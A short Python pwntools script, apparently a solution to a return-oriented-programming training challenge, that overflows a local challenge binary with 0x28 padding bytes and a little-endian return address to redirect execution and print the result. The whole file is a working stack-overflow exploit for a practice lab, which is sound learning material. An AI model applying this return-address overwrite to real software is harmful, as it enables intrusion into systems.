from pwn import *

p = process("/challenge/babyrop_level2.1")

p.send(b"A"*0x28 + 0x401FBC.to_bytes(8,"little"))
all = p.recvall()
print(all.decode())